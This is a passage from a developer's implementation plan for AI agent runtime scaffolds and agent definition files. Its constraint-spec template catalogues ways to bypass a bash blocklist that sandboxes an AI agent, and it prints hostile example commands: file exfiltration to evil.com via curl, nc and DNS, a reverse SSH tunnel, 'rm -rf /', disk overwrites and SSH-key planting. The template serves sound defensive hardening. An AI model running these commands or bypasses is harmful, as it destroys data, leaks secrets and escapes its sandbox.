"""CLI entry point for nano-tier mini-amplifier agents.
```
Replace with:
```
"""CLI entry point for micro-tier mini-amplifier agents.
```

**Change 2:** Add micro features to the docstring:

Find:
```
    - Provider switching via /provider command in chat REPL
"""
```
Replace with:
```
    - Provider switching via /provider command in chat REPL
    - Mode switching via /mode command (work/review/plan)
    - Recipe execution via /recipe command
    - Sub-agent delegation via /delegate command
    - Approval gates (--approval-mode flag: always/dangerous/never)
"""
```

**Change 3:** Add `/mode`, `/recipe`, `/delegate` commands to the REPL. In `cmd_chat`, after the `/provider` command handler, add:

```python
        if user_input.startswith("/mode"):
            parts = user_input.split(maxsplit=1)
            if len(parts) > 1:
                console.print(f"[dim]Mode switching: {parts[1]}[/dim]")
            else:
                console.print("[dim]Usage: /mode <name> (work/review/plan)[/dim]")
            continue

        if user_input.startswith("/recipe"):
            parts = user_input.split(maxsplit=1)
            if len(parts) > 1:
                console.print(f"[dim]Recipe execution: {parts[1]}[/dim]")
            else:
                console.print("[dim]Usage: /recipe <path.yaml>[/dim]")
            continue

        if user_input.startswith("/delegate"):
            parts = user_input.split(maxsplit=1)
            if len(parts) > 1:
                console.print(f"[dim]Delegating: {parts[1]}[/dim]")
            else:
                console.print("[dim]Usage: /delegate <task description>[/dim]")
            continue
```

**Change 4:** Add `--approval-mode` to the chat subparser in `build_parser()`:

```python
    p_chat.add_argument(
        "--approval-mode",
        choices=["always", "dangerous", "never"],
        default="dangerous",
        help="Approval gate mode (default: dangerous)",
    )
```

### Step 10: Update `runtime/micro/runtime.py`

Add imports for the micro-specific modules. At the top, after the existing nano imports, add:

```python
from .modes import ModeManager
from .recipes import RecipeRunner
from .delegate import Delegator
from .approval import ApprovalGate
from .loader import PluginLoader
```

And update the docstring to mention micro integration:

Find the line about nano extensions and replace with:
```
Nano extensions: streaming responses, session persistence, dynamic context
loading, and multi-provider support are integrated via the nano-specific modules.

Micro extensions: modes, recipes, delegation, approval gates, and dynamic
module loader are integrated via the micro-specific modules.
"""
```

### Step 11: Run the tests

```bash
cd /Users/michaeljabbour/dev/amplifier-bundle-autoharness
python -m pytest tests/test_micro_scaffold.py -v
```

Expected: ALL PASS.

### Step 12: Run ALL scaffold tests together

```bash
cd /Users/michaeljabbour/dev/amplifier-bundle-autoharness
python -m pytest tests/test_pico_scaffold.py tests/test_nano_scaffold.py tests/test_micro_scaffold.py tests/test_scaffold.py -v
```

Expected: All pico, nano, micro structural tests pass. The updated `TestRuntime` in `test_scaffold.py` should also pass.

### Step 13: Commit

```bash
cd /Users/michaeljabbour/dev/amplifier-bundle-autoharness
git add runtime/micro/ tests/test_micro_scaffold.py
git commit -m "feat: add micro runtime scaffold with modes, recipes, delegation, approval gates

- Copy nano scaffold as base, add 5 micro-specific modules
- modes.py: mini mode system with work/review/plan, system prompt overlays,
  per-mode tool restrictions, runtime switching via /mode command
- recipes.py: mini recipe runner loading YAML definitions, sequential step
  execution, while_condition loops, approval gates between steps,
  context accumulation across steps
- delegate.py: sub-agent spawning with fresh PicoAgent instances,
  clean context per delegation, constrained tool sets
- approval.py: human-in-loop approval gates with three modes
  (always/dangerous/never), sensitive operation detection,
  destructive pattern matching
- loader.py: mini plugin loader using importlib, discovers .py files
  in plugins/ directory, supports get_tools() and get_constraints() interfaces
- Enhanced cli.py: /mode, /recipe, /delegate commands, --approval-mode flag
- Enhanced runtime.py: imports modes, recipes, delegate, approval, loader
- 50 structural tests in tests/test_micro_scaffold.py"
```

---

## Summary: What You've Built

After all 3 tasks, the `runtime/` directory looks like this:

```
runtime/
├── pico/                      # ~800-1,200 lines (9 files)
│   ├── __init__.py
│   ├── cli.py                 # Rich + Markdown + signal handling
│   ├── runtime.py             # Async agent loop + constraint gate + retry
│   ├── tools.py               # 7 tools + project_root enforcement
│   ├── gate.py                # ConstraintGate wrapper
│   ├── setup.sh.template
│   ├── pyproject.toml.template
│   ├── Dockerfile.template
│   └── docker-compose.template.yaml
│
├── nano/                      # ~2,000-3,500 lines (13 files)
│   ├── (everything in pico)
│   ├── streaming.py           # Async streaming + fallback
│   ├── session.py             # JSON session persistence
│   ├── context.py             # @mention dynamic context loading
│   └── providers.py           # Multi-provider config + switching
│
└── micro/                     # ~5,000-8,000 lines (18 files)
    ├── (everything in nano)
    ├── modes.py               # work/review/plan + prompt overlays
    ├── recipes.py             # YAML recipe runner + while loops
    ├── delegate.py            # Sub-agent spawning
    ├── approval.py            # Human-in-loop approval gates
    └── loader.py              # Plugin loader via importlib
```

**Test coverage:** ~135 structural tests across 3 test files, plus the updated `TestRuntime` in `test_scaffold.py`.

**Next:** Phase B (Tasks 4-7) and Phase C (Tasks 8-10) follow below.

---

## Phase B: Agents + Context

Phase B adds 2 new agents, updates 6 existing agents, creates the expanded constraint spec template, and wires everything together. Each task follows the same structural-test-first pattern as Phase A.

---

## Task 4: Mission-Architect Agent + Constraint Spec Template

**What you're building:** Two new files — the mission-architect agent that turns a user's mission description into a meaningful name, domain-specific system prompt, README, and context docs; and an expanded constraint spec template capturing ALL known bash attack vectors from the pico-amplifier hardening rounds.

**Files to CREATE:**
- `agents/mission-architect.md`
- `context/constraint-spec-template.md`

**Test file:** `tests/test_scaffold.py` (update existing `TestAgents` and `TestContextFiles` classes — done in Task 10)

### Step 1: Write the failing test

Add this to `tests/test_scaffold.py` temporarily to verify the file doesn't exist yet:

```bash
cd /Users/michaeljabbour/dev/amplifier-bundle-autoharness
python -c "import os; assert not os.path.isfile('agents/mission-architect.md'), 'already exists'; print('CONFIRMED: file does not exist yet')"
python -c "import os; assert not os.path.isfile('context/constraint-spec-template.md'), 'already exists'; print('CONFIRMED: file does not exist yet')"
```

Expected: Both print "CONFIRMED: file does not exist yet".

### Step 2: Create `agents/mission-architect.md`

```markdown
---
meta:
  name: mission-architect
  description: |
    Use when the user describes a mission for their mini-amplifier and you need to
    distill it into a meaningful name, domain-specific system prompt, README, and context docs.

    Takes raw mission descriptions like "cure my dog's cancer with genomics and AlphaFold"
    and produces: a name (nano-amplifier-tumor-genome-to-vaccine), a system prompt that knows
    the domain (genomics pipelines, protein folding, drug targets), a README tailored to
    the mission, and context documentation explaining what the agent does.

    <example>
    Context: User wants to build a genomics specialist mini-amplifier
    user: "I want to sequence tumor DNA, identify mutated proteins, match to drug targets, design an mRNA vaccine"
    assistant: "I'll delegate to harness-machine:mission-architect to create the identity for your mini-amplifier."
    <commentary>
    The mission-architect distills the mission into a name, system prompt, and documentation.
    It does NOT generate constraint code — that's the harness-generator's job.
    </commentary>
    </example>

    <example>
    Context: User wants a Kubernetes platform engineer mini-amplifier
    user: "Build me an agent that manages k8s clusters — deploy, monitor, troubleshoot, security audit"
    assistant: "I'll delegate to harness-machine:mission-architect to name and document this mini-amplifier."
    <commentary>
    Any mission description triggers the mission-architect. It always produces the naming
    convention: {tier}-amplifier-{mission-slug}.
    </commentary>
    </example>

  model_role: [creative, reasoning, general]
tools:
  - module: tool-filesystem
    source: git+https://github.com/microsoft/amplifier-module-tool-filesystem@main
  - module: tool-search
    source: git+https://github.com/microsoft/amplifier-module-tool-search@main
  - module: tool-bash
    source: git+https://github.com/microsoft/amplifier-module-tool-bash@main
---

# Mission Architect

You create the identity for mini-amplifiers — turning raw mission descriptions into meaningful names, domain-specific system prompts, READMEs, and context documentation.

**Execution model:** You receive a mission description and a selected tier (pico/nano/micro) via delegation instruction. You produce the mini-amplifier's identity artifacts. You do NOT generate constraint code or runtime scaffolds.

## Your Knowledge

@harness-machine:context/harness-format.md
@harness-machine:context/constraint-spec-template.md

## Naming Convention

Every mini-amplifier gets a meaningful name following this pattern:

```
{tier}-amplifier-{mission-slug}
```

Examples:
- `pico-amplifier-tumor-genome-to-vaccine`
- `nano-amplifier-k8s-security-auditor`
- `micro-amplifier-lab-protocol-assistant`
- `nano-amplifier-contract-review-engine`

### Naming Rules

1. **Mission slug** must describe the PIPELINE, not just the domain. "tumor-genome-to-vaccine" is better than "genomics" because it describes input → output.
2. **Hyphens only.** No underscores, no camelCase, no spaces.
3. **Max 5 words** in the mission slug. Compress if needed.
4. **No generic names.** "agent", "helper", "tool", "bot" are banned. Be specific.
5. **Check for CLI name collision.** The name becomes a CLI command. It must NOT collide with common Unix utilities.

### Reserved CLI Names (Hard Block)

These names are taken by common Unix/macOS utilities. If the proposed name collides, propose an alternative:

```
pico, nano, micro, vi, vim, emacs, ed, cat, less, more, head, tail, grep, find,
awk, sed, sort, cut, tr, wc, diff, patch, file, test, true, false, yes, time,
date, cal, bc, dc, make, cc, ld, ar, nm, strip, ls, cp, mv, rm, mkdir, rmdir,
touch, chmod, chown, chgrp, ln, stat, du, df, mount, umount, tar, gzip, bzip2,
zip, unzip, curl, wget, ssh, scp, rsync, git, python, python3, pip, node, npm,
docker, kubectl, helm, terraform, aws, gcloud, az
```

If ANY of these are a prefix of the proposed CLI name (e.g., `nano-amplifier-...` starts with `nano`), this is NOT a collision — the full hyphenated name is the CLI command, not just the first word.

## Output Artifacts

When delegated to, produce these four artifacts:

### 1. Meaningful Name

The `{tier}-amplifier-{mission-slug}` name. Present it to the delegating agent for user approval before proceeding.

### 2. System Prompt (`system-prompt.md`)

A domain-specific system prompt that:
- Knows the field (uses correct terminology, references real tools/databases/APIs)
- Lists ONLY the tools actually selected in the capability picker (never mentions tools the agent doesn't have)
- Includes the Amplifier-aware escape hatch (see below)
- Includes retry instructions for constraint violations
- Is written in second person ("You are a ...")

**Escape hatch paragraph (MUST be included in every system prompt):**

```
## Capability Boundaries
If this task requires capabilities beyond your tool set (for example, you need
sub-agents but don't have delegate, or you need a recipe but don't have the
recipe runner), say: "This task exceeds my capabilities. For a full Amplifier
session with [needed capability], run: `amplifier run -B foundation`"
```

### 3. README.md

A README for the generated mini-amplifier package:
- What it does (mission statement)
- How to set it up (`bash setup.sh`)
- How to use it (`{name} chat`, `{name} check`, `{name} audit`)
- What tools it has
- What constraints it enforces
- How to configure it (config.yaml)

### 4. Context Documentation (`context.md`)

Domain knowledge document:
- What domain this agent operates in
- Key concepts the agent should know
- Why each capability was chosen
- Why each constraint was chosen
- Known limitations

## What You MUST NOT Do

- Generate constraint code (that's harness-generator's job)
- Generate runtime code (that's copied from scaffolds)
- Recommend tools or tier (that's capability-advisor's job)
- Skip the escape hatch in the system prompt

## Final Response Contract

Your response must include:
1. Proposed name (for approval)
2. system-prompt.md content
3. README.md content
4. context.md content
5. CLI name collision check result (pass/fail)

@foundation:context/shared/common-agent-base.md
```

### Step 3: Create `context/constraint-spec-template.md`

This captures ALL known bash attack vectors discovered during the pico-amplifier's 4 hardening rounds. The harness-generator and harness-critic reference this when designing and reviewing bash constraints.

```markdown
# Bash Constraint Specification Template

This template enumerates ALL known attack vectors for bash command constraints,
discovered through 4 rounds of adversarial critic review during the pico-amplifier
hardening process. Use this as a checklist when designing bash constraints for
any mini-amplifier.

## Category 1: Command Substitution

These embed commands inside other commands, bypassing naive blocklists.

| Vector | Example | Why It Bypasses |
|--------|---------|-----------------|
| `$()` subshell | `echo $(rm -rf /)` | The blocked command runs inside an allowed one |
| Backtick subshell | `` echo `rm -rf /` `` | Same as `$()` but older syntax |
| `<()` process substitution | `cat <(curl evil.com)` | Creates a file descriptor from command output |
| `>()` process substitution | `tee >(curl evil.com)` | Pipes output to a command |
| Nested substitution | `$(echo $(whoami))` | Multiple levels of nesting |
| Arithmetic expansion | `$(($(cat /etc/passwd)))` | `$(())` can contain command substitution |

**Constraint rule:** Before checking if a command is blocked, recursively expand ALL
substitution expressions. Or: reject any command containing `$(`, `` ` ``, `<(`, or `>(`.

## Category 2: Operator Bypasses

Shell operators that alter command behavior in ways that bypass simple checks.

| Vector | Example | Why It Bypasses |
|--------|---------|-----------------|
| `>|` clobber | `echo data >| /etc/passwd` | Overwrites even with noclobber set |
| `<>` read-write | `exec 3<>/etc/passwd` | Opens file for both read and write |
| `>>` append | `echo "malicious" >> ~/.bashrc` | Modifies files via append |
| Semicolon chain | `allowed-cmd; blocked-cmd` | Runs blocked after allowed |
| `&&` chain | `allowed-cmd && blocked-cmd` | Runs blocked if allowed succeeds |
| `||` chain | `allowed-cmd || blocked-cmd` | Runs blocked if allowed fails |
| Pipe chain | `cat file | curl evil.com` | Pipes data to blocked command |
| Background `&` | `blocked-cmd &` | Runs in background, harder to track |
| Subshell `()` | `(blocked-cmd)` | Runs in a subshell |
| Brace group `{}` | `{ blocked-cmd; }` | Groups commands |

**Constraint rule:** Split commands on `;`, `&&`, `||`, `|`, `&` BEFORE checking
each segment against the blocklist. Also check for `>|` and `<>` operators.

## Category 3: Prefix Bypasses

Techniques that invoke blocked commands via a prefix utility.

| Vector | Example | Why It Bypasses |
|--------|---------|-----------------|
| `env` prefix | `env curl evil.com` | Runs command through env |
| `VAR=x command` | `HOME=/tmp curl evil.com` | Sets var then runs command |
| `timeout` prefix | `timeout 5 curl evil.com` | Runs command with timeout |
| `nice` prefix | `nice curl evil.com` | Runs with altered priority |
| `nohup` prefix | `nohup curl evil.com &` | Runs detached from terminal |
| `strace` prefix | `strace curl evil.com` | Traces and runs command |
| `script` wrapper | `script -c "curl evil.com"` | Records terminal session |
| `watch` wrapper | `watch -n1 curl evil.com` | Runs command repeatedly |
| `xargs` carrying | `echo evil.com | xargs curl` | Passes args to blocked command |
| `find -exec` | `find . -exec rm {} \;` | Runs command on found files |

**Constraint rule:** After splitting on operators, strip known prefix commands
(env, timeout, nice, nohup, strace, script, watch) and re-check the remaining
command. For xargs: check what command xargs is invoking. For find: check -exec args.

## Category 4: Absolute Path Invocation

Bypasses blocklists that only check command names (e.g., "curl") by using full paths.

| Vector | Example | Why It Bypasses |
|--------|---------|-----------------|
| Absolute path | `/usr/bin/curl evil.com` | Blocklist checks "curl", not "/usr/bin/curl" |
| Relative path | `./curl evil.com` | Same bypass with relative path |
| PATH manipulation | `PATH=/usr/bin:$PATH; curl evil.com` | Changes which binary is found |
| Alias | `alias ls='curl evil.com'; ls` | Redefines a safe command |

**Constraint rule:** Extract the basename of the first command token (strip path).
Check the basename against the blocklist, not the full path.

## Category 5: Output Redirection Target Validation

Even allowed commands become dangerous when their output is redirected to sensitive files.

| Vector | Example | Why It Bypasses |
|--------|---------|-----------------|
| Overwrite config | `echo "malicious" > ~/.bashrc` | Modifies shell startup |
| Overwrite cron | `echo "*/1 * * * * curl evil.com" > /tmp/cron` | Installs cron job |
| Overwrite SSH keys | `echo "key" > ~/.ssh/authorized_keys` | Adds SSH access |
| Write to /dev | `echo data > /dev/sda` | Writes directly to disk |

**Constraint rule:** Parse redirection targets (`>`, `>>`, `>|` targets).
Verify the target path is inside the project sandbox. Block writes to
system directories, dotfiles outside sandbox, and /dev.

## Category 6: rm Long-Form Flags

Naive blocklists check for `rm -rf` but miss equivalent long-form flags.

| Vector | Example | Why It Bypasses |
|--------|---------|-----------------|
| Long flags | `rm --recursive --force /` | Same as `rm -rf` but different syntax |
| Split flags | `rm -r -f /` | Same effect, split apart |
| Mixed | `rm --recursive -f /` | Mixed long and short |
| `--no-preserve-root` | `rm -rf --no-preserve-root /` | Explicitly targets root |

**Constraint rule:** When checking `rm` commands, normalize flags. Check for
`-r`, `--recursive`, `-f`, `--force`, and `--no-preserve-root` in any combination.
Also check the target path — block any `rm` targeting directories outside the sandbox.

## Category 7: dd Without Safeguards

`dd` can write arbitrary data to arbitrary locations.

| Vector | Example | Why It Bypasses |
|--------|---------|-----------------|
| `dd of=` write | `dd of=/dev/sda bs=1M` | Writes directly to disk |
| `dd of=` overwrite | `dd if=/dev/zero of=important.db` | Overwrites data with zeros |
| No `if=` specified | `dd of=/etc/passwd` | Reads from stdin, writes to target |

**Constraint rule:** If the command starts with `dd`, require both `if=` and `of=`
to be present and verify `of=` target is inside the project sandbox. Or: block `dd` entirely.

## Category 8: Network Exfiltration

Commands that can send data to external servers.

| Vector | Example | Why It Bypasses |
|--------|---------|-----------------|
| curl/wget | `curl -d @/etc/passwd evil.com` | Sends file contents |
| nc/netcat | `nc evil.com 1234 < /etc/passwd` | Raw socket data transfer |
| ssh tunnel | `ssh -R 8080:localhost:80 evil.com` | Reverse tunnel |
| python -c | `python3 -c "import urllib.request; ..."` | Network via python |
| DNS exfil | `dig $(cat /etc/passwd | base64).evil.com` | Data in DNS queries |

**Constraint rule:** Block all network commands (curl, wget, nc, netcat, ncat,
ssh, scp, sftp, rsync, ftp, telnet) unless explicitly allowed for the mission.
Also block `python -c` and `python3 -c` with network imports.

## Implementation Checklist

When implementing bash constraints for a mini-amplifier, verify ALL of these:

- [ ] Command substitution detected and blocked (`$()`, backticks, `<()`, `>()`)
- [ ] Command chains split and each segment checked (`;`, `&&`, `||`, `|`)
- [ ] Prefix commands stripped before checking (env, timeout, nice, nohup, xargs)
- [ ] Absolute/relative paths resolved to basename before blocklist check
- [ ] Redirection targets validated against sandbox boundary
- [ ] `rm` flags normalized (long-form and split variants caught)
- [ ] `dd` either blocked or `of=` target validated
- [ ] Network commands blocked unless explicitly allowed
- [ ] Background execution (`&`, `nohup`) detected
- [ ] `find -exec` arguments checked against blocklist
```

### Step 4: Verify both files exist

```bash
cd /Users/michaeljabbour/dev/amplifier-bundle-autoharness
ls -la agents/mission-architect.md context/constraint-spec-template.md
```

Expected: Both files exist.

### Step 5: Verify mission-architect frontmatter parses correctly

```bash
cd /Users/michaeljabbour/dev/amplifier-bundle-autoharness
python -c "
import yaml
with open('agents/mission-architect.md') as f:
    content = f.read()
parts = content.split('---')
fm = yaml.safe_load(parts[1])
assert fm['meta']['name'] == 'mission-architect'
assert 'creative' in fm['meta']['model_role']
assert 'reasoning' in fm['meta']['model_role']
assert len(fm['tools']) == 3
print('PASS: mission-architect frontmatter is valid')
"
```

Expected: "PASS: mission-architect frontmatter is valid"

### Step 6: Verify constraint-spec-template has all 8 categories

```bash
cd /Users/michaeljabbour/dev/amplifier-bundle-autoharness
python -c "
with open('context/constraint-spec-template.md') as f:
    content = f.read()
for cat in ['Category 1', 'Category 2', 'Category 3', 'Category 4',
            'Category 5', 'Category 6', 'Category 7', 'Category 8']:
    assert cat in content, f'Missing {cat}'
# Verify specific attack vectors from pico-amplifier hardening rounds
assert 'xargs' in content
assert '>|' in content
assert '<>' in content
assert 'dd of=' in content or 'dd' in content
assert '--recursive' in content
assert '--force' in content
assert 'process substitution' in content.lower()
assert 'Implementation Checklist' in content
print('PASS: constraint-spec-template has all 8 categories and key vectors')
"
```

Expected: "PASS: constraint-spec-template has all 8 categories and key vectors"

### Step 7: Commit

```bash
cd /Users/michaeljabbour/dev/amplifier-bundle-autoharness
git add agents/mission-architect.md context/constraint-spec-template.md
git commit -m "feat: add mission-architect agent and expanded constraint spec template

- agents/mission-architect.md: takes user's mission description and produces
  meaningful name ({tier}-amplifier-{mission-slug}), domain-specific system
  prompt, README.md, context.md. Includes reserved CLI name checker,
  Amplifier-aware escape hatch, naming convention rules.
  Model roles: creative, reasoning, general. Tools: filesystem, search, bash.
- context/constraint-spec-template.md: 8 categories of bash attack vectors
  from pico-amplifier's 4 hardening rounds — command substitution, operator
  bypasses, prefix bypasses, absolute path invocation, output redirection
  target validation, rm long-form flags, dd safeguards, network exfiltration.
  Includes implementation checklist for constraint designers."
```

---

## Task 5: Capability-Advisor Agent

**What you're building:** The capability-advisor agent that reads the dynamic module inventory and the user's mission, then recommends tools, provider, tier, and presents a pre-checked markdown capability picker.

**Files to CREATE:**
- `agents/capability-advisor.md`

### Step 1: Verify file doesn't exist yet

```bash
cd /Users/michaeljabbour/dev/amplifier-bundle-autoharness
python -c "import os; assert not os.path.isfile('agents/capability-advisor.md'), 'already exists'; print('CONFIRMED: file does not exist yet')"
```

Expected: "CONFIRMED: file does not exist yet"

### Step 2: Create `agents/capability-advisor.md`

```markdown
---
meta:
  name: capability-advisor
  description: |
    Use when the user has described a mission and you need to recommend which tools,
    providers, tier, and features to include in the mini-amplifier.

    Reads the dynamic module inventory (from amplifier module list / amplifier bundle list)
    and cross-references it with the user's mission to recommend optimal capability selections.
    Produces a pre-checked markdown capability picker.

    <example>
    Context: User wants to build a genomics specialist
    user: "What tools and provider should my tumor-genome-to-vaccine agent have?"
    assistant: "I'll delegate to harness-machine:capability-advisor to analyze the mission and recommend capabilities."
    <commentary>
    The capability-advisor recommends based on mission analysis, not user preference alone.
    It explains WHY each tool is recommended.
    </commentary>
    </example>

    <example>
    Context: User wants a Kubernetes security auditor
    user: "What tier should this be? What features does it need?"
    assistant: "I'll delegate to harness-machine:capability-advisor to assess the tier and feature requirements."
    <commentary>
    Tier recommendation comes from capability analysis — if the mission needs modes or
    delegation, the advisor recommends micro. If it needs streaming, nano. If it's
    single-purpose, pico.
    </commentary>
    </example>

  model_role: [reasoning, general]
tools:
  - module: tool-filesystem
    source: git+https://github.com/microsoft/amplifier-module-tool-filesystem@main
  - module: tool-search
    source: git+https://github.com/microsoft/amplifier-module-tool-search@main
  - module: tool-bash
    source: git+https://github.com/microsoft/amplifier-module-tool-bash@main
---

# Capability Advisor

You analyze a user's mission and the available Amplifier ecosystem to recommend the optimal capabilities for their mini-amplifier.

**Execution model:** You receive a mission description, the dynamic module inventory, and optionally the environment-analyst's feasibility assessment. You produce capability recommendations and a pre-checked markdown picker.

## Your Knowledge

@harness-machine:context/harness-format.md
@harness-machine:context/pattern.md

## Dynamic Discovery

Before making recommendations, inventory what's available. If the module inventory
was not provided in the delegation instruction, run discovery:

```bash
amplifier module list 2>/dev/null || echo "DISCOVERY_UNAVAILABLE"
amplifier bundle list --all 2>/dev/null || echo "DISCOVERY_UNAVAILABLE"
```

If discovery fails (Amplifier not installed, older version), fall back to the
known ecosystem baseline (67 modules, 37 bundles). Inform the delegating agent
that dynamic discovery was unavailable.

## Recommendation Process

### 1. Analyze the Mission

From the delegation instruction, extract:
- What domain? (genomics, security, infrastructure, legal, ...)
- What data sources? (databases, APIs, filesystems, ...)
- What tools? (bioinformatics CLI tools, kubectl, compilers, ...)
- What workflow? (linear, iterative, parallel, conversational, ...)
- How long are sessions? (quick one-shot vs. long research sessions)

### 2. Recommend Tier

| If the mission needs... | Recommend | Because |
|-------------------------|-----------|---------|
| One task, one provider, quick sessions | **pico** | Laser focus, minimal overhead |
| Multiple tools, streaming, longer sessions | **nano** | Sweet spot — 80% capability, 20% size |
| Multi-step workflows, delegation, modes | **micro** | Near-full Amplifier capability |
| Session persistence, provider switching | **nano** or **micro** | Pico doesn't have these |
| Approval gates, recipes | **micro** | Only micro has these features |

### 3. Recommend Tools

For each recommended tool, explain WHY:

```
- web_fetch: "For querying NCBI/UniProt protein databases and AlphaFold structure predictions"
- bash: "For running bioinformatics tools (BLAST, samtools, bcftools)"
- python_check: "For validating data analysis scripts before execution"
```

Always include the base tools (read_file, write_file, edit_file, apply_patch, grep, glob) — they're in every tier.

Only recommend tools that the tier supports. Don't recommend `delegate` for pico tier.

### 4. Recommend Provider

Match provider to mission requirements:

| Mission Characteristic | Recommended Provider | Reason |
|-----------------------|---------------------|--------|
| Complex reasoning, multi-step analysis | Anthropic Claude | Strong reasoning and tool use |
| Code generation focus | Anthropic Claude or OpenAI GPT | Both strong at code |
| Cost-sensitive / high-volume | OpenAI GPT or Gemini | Lower per-token cost |
| Privacy-critical / offline | Ollama (local) | No data leaves the machine |
| Enterprise with existing contracts | Azure OpenAI | Existing compliance |

### 5. Detect Tier Conflicts

If the user's mission implies features that the selected tier doesn't support, FLAG IT:

```
WARNING: Your mission mentions "running parallel security scans" which requires
sub-agent delegation. Pico tier does not support delegation. Recommend upgrading
to nano or micro tier, or dropping the parallel scanning requirement.
```

This is a hard warning — present it clearly and let the user decide.

## Output: Capability Picker

Your primary output is a markdown capability picker with pre-checked recommendations:

```markdown
## Configure your {tier}-amplifier-{name}

### Mission
{user's mission description}

### Recommended Tier: {tier}
{rationale for tier recommendation}

### LLM Providers
- [x] Anthropic Claude (recommended: {reason})
- [ ] OpenAI GPT
- [ ] Google Gemini
- [ ] Ollama (local/offline)
- [ ] Azure OpenAI
{dynamically populated from module inventory if available}

### Tools
- [x] read_file / write_file / edit_file / apply_patch (always included)
- [x] bash (sandboxed) — {mission-specific reason}
- [x] grep / glob (code search) — always included
- [x] web_fetch / web_search — {mission-specific reason}
- [ ] delegate (spawn sub-agents) {greyed if pico}
- [ ] todo (task tracking)
- [ ] LSP (code intelligence)
- [ ] python_check (linting + types)
- [ ] skills (loadable knowledge)
- [ ] MCP (external tool servers)
- [ ] memory (persistent across sessions)

### Features (varies by tier)
- [x] Streaming responses {if nano or micro}
- [x] Rich markdown CLI output (always included)
- [x] Proper signal handling (always included)
- [ ] Session persistence {if nano or micro}
- [ ] Dynamic context loading {if nano or micro}
- [ ] Modes (switchable behaviors) {if micro only}
- [ ] Recipes (multi-step workflows) {if micro only}
- [ ] Approval gates (human-in-loop) {if micro only}
- [ ] Sub-agent delegation {if micro only}

### Deployment
- [x] Standalone CLI (always included)
- [x] Amplifier hook module (always included)
- [ ] Docker container (optional)
```

Items marked `{greyed if pico}` should be presented as:
```
- [ ] ~~delegate (spawn sub-agents)~~ — requires nano or micro tier
```

## What You MUST NOT Do

- Generate constraint code
- Generate runtime code
- Name the mini-amplifier (that's mission-architect's job)
- Skip the tier conflict detection
- Recommend tools without explaining why

## Final Response Contract

Your response must include:
1. Recommended tier with rationale
2. Recommended provider with rationale
3. Recommended tools with per-tool rationale
4. Tier conflict warnings (if any)
5. Complete capability picker markdown (pre-checked based on analysis)
6. Discovery status (dynamic or static fallback)

@foundation:context/shared/common-agent-base.md
```

### Step 3: Verify frontmatter parses correctly

```bash
cd /Users/michaeljabbour/dev/amplifier-bundle-autoharness
python -c "
import yaml
with open('agents/capability-advisor.md') as f:
    content = f.read()
parts = content.split('---')
fm = yaml.safe_load(parts[1])
assert fm['meta']['name'] == 'capability-advisor'
assert 'reasoning' in fm['meta']['model_role']
assert len(fm['tools']) == 3
print('PASS: capability-advisor frontmatter is valid')
"
```

Expected: "PASS: capability-advisor frontmatter is valid"

### Step 4: Commit

```bash
cd /Users/michaeljabbour/dev/amplifier-bundle-autoharness
git add agents/capability-advisor.md
git commit -m "feat: add capability-advisor agent with dynamic module picker

- agents/capability-advisor.md: reads dynamic module inventory (amplifier module
  list / amplifier bundle list --all) and cross-references with user's mission.
  Recommends tools (with per-tool rationale), provider, tier (pico/nano/micro),
  and features. Detects tier conflicts (e.g., pico can't do delegation).
  Produces pre-checked markdown capability picker.
  Model roles: reasoning, general. Tools: filesystem, search, bash."
```

---

## Task 6: Update Environment-Analyst Agent

**What you're modifying:** `agents/environment-analyst.md` — adding dynamic discovery (runs `amplifier module list` and `amplifier bundle list --all`), open-question flow, and capability picker presentation.

**File to MODIFY:**
- `agents/environment-analyst.md`

### Step 1: Read the current file

```bash
cd /Users/michaeljabbour/dev/amplifier-bundle-autoharness
cat agents/environment-analyst.md
```

### Step 2: Apply the changes

The environment-analyst needs three additions:

**Addition 1:** Add dynamic discovery to the exploration approach. After the existing "### 4. Assess Evaluation Feasibility" section (before "### 5. Score Feasibility"), add a new section:

Find this text in `agents/environment-analyst.md`:
```
### 5. Score Feasibility
```

Insert BEFORE it:
```markdown
### 4b. Dynamic Capability Discovery

As part of exploration, inventory the available Amplifier ecosystem:

```bash
amplifier module list 2>/dev/null || echo "DISCOVERY_UNAVAILABLE"
amplifier bundle list --all 2>/dev/null || echo "DISCOVERY_UNAVAILABLE"
```

Organize the inventory by type:
- **Providers:** Which LLM providers are installed (Anthropic, OpenAI, Gemini, Ollama, etc.)
- **Tools:** Which tool modules are available (filesystem, bash, web, search, delegate, etc.)
- **Hooks:** Which hook modules are available (logging, redaction, approval, etc.)
- **Orchestrators:** Which orchestrator types are available (basic, streaming, events)
- **Bundles:** Which bundles are installed or available

If discovery fails (Amplifier not installed or older version), note this in the feasibility
assessment and fall back to the known ecosystem baseline.

### 4c. Open Questions

After mapping the action space, ask the user open questions to fill gaps — one question at a time.
Pattern your questions like the superpowers brainstorm mode:

- Ask ONE question per message
- Prefer multiple-choice when possible
- Focus on: What's the mission? What tools does the domain use? What databases/APIs matter?
  How long are typical sessions? Does the user need offline capability?
- Stop asking when you have enough to assess feasibility AND recommend capabilities

### 4d. Amplifier Escalation Detection

During exploration, assess whether the mission REQUIRES a full Amplifier session.
Indicators that a mini-amplifier won't suffice:

- Mission requires more than 25 simultaneous tools
- Mission requires dynamic module loading at runtime (micro tier may suffice)
- Mission requires multiple concurrent agent sessions
- Mission requires real-time event-driven processing

If escalation is detected, recommend full Amplifier: "This mission exceeds what a
mini-amplifier can provide. For a full Amplifier session: `amplifier run -B foundation`"
```

**Addition 2:** Update the Output Format section to include the capability inventory. Find:
```
## Output Format

Your response back to the delegating agent must include:

1. **Environment map**: Action types, parameters, state representation
2. **Legal/illegal boundaries**: Rules for each action type
3. **Feasibility scores**: Per-dimension with evidence
4. **Recommended harness_type**: Based on action space characteristics
5. **Recommended harness_scale**: Based on scope
6. **Blockers or risks**: Anything that could prevent successful generation
```

Replace with:
```
## Output Format

Your response back to the delegating agent must include:

1. **Environment map**: Action types, parameters, state representation
2. **Legal/illegal boundaries**: Rules for each action type
3. **Feasibility scores**: Per-dimension with evidence
4. **Recommended harness_type**: Based on action space characteristics
5. **Recommended harness_scale**: Based on scope
6. **Blockers or risks**: Anything that could prevent successful generation
7. **Capability inventory**: Available modules organized by type (from dynamic discovery)
8. **Escalation assessment**: Whether this mission needs full Amplifier (yes/no with rationale)
```

### Step 3: Verify the updated file still has valid frontmatter

```bash
cd /Users/michaeljabbour/dev/amplifier-bundle-autoharness
python -c "
import yaml
with open('agents/environment-analyst.md') as f:
    content = f.read()
parts = content.split('---')
fm = yaml.safe_load(parts[1])
assert fm['meta']['name'] == 'environment-analyst'
assert 'Dynamic Capability Discovery' in content
assert 'amplifier module list' in content
assert 'amplifier bundle list' in content
